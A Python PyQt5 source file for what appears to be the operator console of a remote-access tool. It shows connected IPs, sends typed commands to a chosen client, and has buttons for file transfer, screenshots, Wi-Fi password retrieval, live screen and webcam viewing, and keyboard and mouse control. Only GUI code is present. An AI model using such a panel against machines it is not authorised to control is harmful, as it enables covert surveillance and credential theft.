from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import (QDialog, QMainWindow, QApplication, QVBoxLayout, QHBoxLayout, QMenuBar,
                            QListWidget, QLabel, QPushButton, QPlainTextEdit, QLineEdit,QGroupBox, QGridLayout, QWidget, QMessageBox)
from PyQt5.QtCore import Qt, pyqtSlot, QObject, pyqtSignal, QRunnable, QThreadPool
import sys
import os
import time
import traceback
import qdarkstyle

class Window(QWidget):
    def __init__(self, server):
        super().__init__()
        
        self.title = "server"
        self.left = 200
        self.top = 200
        self.width = 1200
        self.height = 600
        self.iconName = "ico.ico"
        self.all_text = {}  # PlainText에 있는 텍스트 저장
        self.cur_ip = ""
        self.threadpool = QThreadPool()
        self.InitUI()
        self.server = server
        self.server.App.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())


    def InitUI(self):
        #self.menuBar = QMenuBar(self)
        #fileMenu = self.menuBar.addMenu("File")

        self.setWindowTitle(self.title)
        self.setWindowIcon(QIcon(self.iconName))
        self.setGeometry(self.left, self.top, self.width, self.height)

        hbox = QHBoxLayout()

        leftvbox = QVBoxLayout()
        self.ip_list_creator(leftvbox)

        rightvbox = QVBoxLayout()
        self.func_group_creator(rightvbox)

        leftvbox.setSpacing(1)
        # 왼쪽 사이즈 고정 시키기 위해서 위젯에 레이아웃을 넣음
        leftwidget = QWidget()
        leftwidget.setLayout(leftvbox)
        leftwidget.setFixedWidth(250)

        hbox.addWidget(leftwidget)
        hbox.addLayout(rightvbox)
        self.setLayout(hbox)
        self.show()

    def ip_list_creator(self, layout):
        """ IP 목록 UI 생성 """
        self.ip_label = QLabel("연결된 IP 목록", self)
        self.ip_list = QListWidget(self)
        self.ip_list.clicked.connect(self.listview_clicked)
        layout.addWidget(self.ip_label)
        layout.addWidget(self.ip_list)

    def func_group_creator(self, layout):
        """ 기능 버튼 그룹 생성 """
        self.func_group = QGroupBox("기능", self)
        self.func_gridLayout = QGridLayout(self)

        self.fileUploadBtn = QPushButton("파일 업로드", self)
        self.fileDownloadBtn = QPushButton("파일 다운로드", self)
        self.screenShotBtn = QPushButton("스크린캡쳐", self)
        self.runBrowserBtn = QPushButton("브라우저 켜기", self)
        self.getWifiPwBtn = QPushButton("Wifi 비번 구하기", self)
        self.sendMsgBtn = QPushButton("메세지 보내기", self)
        self.sendMsgBtn.clicked.connect(self.send_message)
        self.liveStreamBtn = QPushButton("라이브 스크린 & 캠")
        self.sendKeyBtn = QPushButton("키보드 제어")
        self.sendMouseBtn = QPushButton("마우스 제어")
        
        self.func_gridLayout.addWidget(self.fileUploadBtn, 0, 0)
        self.func_gridLayout.addWidget(self.fileDownloadBtn, 0, 1)
        self.func_gridLayout.addWidget(self.screenShotBtn, 0, 2)
        self.func_gridLayout.addWidget(self.runBrowserBtn, 1, 0)
        self.func_gridLayout.addWidget(self.getWifiPwBtn, 1, 1)
        self.func_gridLayout.addWidget(self.sendMsgBtn, 1, 2)
        self.func_gridLayout.addWidget(self.liveStreamBtn, 2, 0)
        self.func_gridLayout.addWidget(self.sendKeyBtn, 2, 1)
        self.func_gridLayout.addWidget(self.sendMouseBtn, 2, 2)

        self.func_group.setLayout(self.func_gridLayout)

        self.textarea = QPlainTextEdit(self)
        self.textarea.setReadOnly(True)
        
        self.commandLine = QLineEdit(self)
        self.commandLine.setPlaceholderText("명령어를 입력하세요")
        self.commandLine.returnPressed.connect(lambda: self.send_command(self.server))
        layout.addWidget(self.func_group)
        layout.addWidget(self.textarea)
        layout.addWidget(self.commandLine)

    @pyqtSlot()
    def listview_clicked(self):
        """ 리스트뷰 클릭시 해당 ip 선택 & textare 변경 """
        item = self.ip_list.currentItem()
        item = str(item.text())
        self.all_text[self.cur_ip] = self.textarea.toPlainText()
        self.cur_ip = item
        self.textarea.clear()
        if self.all_text[self.cur_ip]:
            self.append_message(self.all_text[self.cur_ip])
        if not self.cur_ip == "":
            self.server.select_ip(item) # select ip address 함수

    def listview_update(self, ips):
        try:
            self.ip_list.clear()
            self.ip_list.addItems(ips)
            self.ip_list.addItem("")

            if not self.cur_ip in ips:
                self.textarea.clear()
                self.append_message(f"[!] 연결된 ip가 없습니다\n새로운 ip를 선택해주세요\n")
                self.cur_ip = ""
                self.ip_list.setCurrentItem(self.ip_list.findItems("", Qt.MatchExactly)[0])
            else:
                self.ip_list.setCurrentItem(self.ip_list.findItems(self.cur_ip, Qt.MatchExactly)[0])

            all_text = {}
            for ip in ips:
                if ip in self.all_text.keys():
                    all_text[ip] = self.all_text[ip]
                else:
                    all_text[ip] = ""
            self.all_text = all_text


            self.append_message("[*] ip리스트 갱신이 완료되었습니다\n")
        except:
            print("예외")

    @pyqtSlot()
    def send_message(self):
        """ 기능 6 : 메세지를 보냄"""
        pass

    @pyqtSlot()
    def send_command(self, server):

        command = self.commandLine.text()
        self.commandLine.clear()
        if self.cur_ip:
            self.textarea.insertPlainText(command + "\n")
            server.control(command)
        else:
            self.append_message(f"ip를 먼저 선택하고 명령어를 입력해주세요 :: {command}\n")
        self.textarea.verticalScrollBar().setValue(self.textarea.verticalScrollBar().maximum())

    @pyqtSlot()
    def append_message(self, message):
        """ 메세지를 추가함 """
        self.textarea.appendPlainText(message) # insert vs append "\n"이 없냐 있냐 & 자동 스크롤이 안되냐 되냐 차이
        self.textarea.viewport().update()


    def clear_message(self):
        """ 메세지를 초기화함 """
        self.textarea.clear()
        if self.cur_ip:
            self.all_text[self.cur_ip] = ""

    def appear_msgbox(self, title, msg):
        QMessageBox.about(self, title, msg)



class WorkerSignals(QObject):
    finished = pyqtSignal()
    error = pyqtSignal(tuple)
    result = pyqtSignal(list)
    progress = pyqtSignal(str)


class Worker(QRunnable):
    def __init__(self, fn, *args, **kwargs):
        super(Worker, self).__init__()

        # Store constructor arguments (re-used for processing)
        self.fn = fn
        self.args = args
        self.kwargs = kwargs
        self.signals = WorkerSignals()

        # Add the callback to our kwargs
        self.kwargs['progress_callback'] = self.signals.progress

    @pyqtSlot()
    def run(self):
        try:
            result = self.fn(*self.args, **self.kwargs)
        except:
            traceback.print_exc()
            exctype, value = sys.exc_info()[:2]
            self.signals.error.emit((exctype, value, traceback.format_exc()))
        else:
            self.signals.result.emit(result)  # Return the result of the processing
        finally:
            self.signals.finished.emit()  # Done
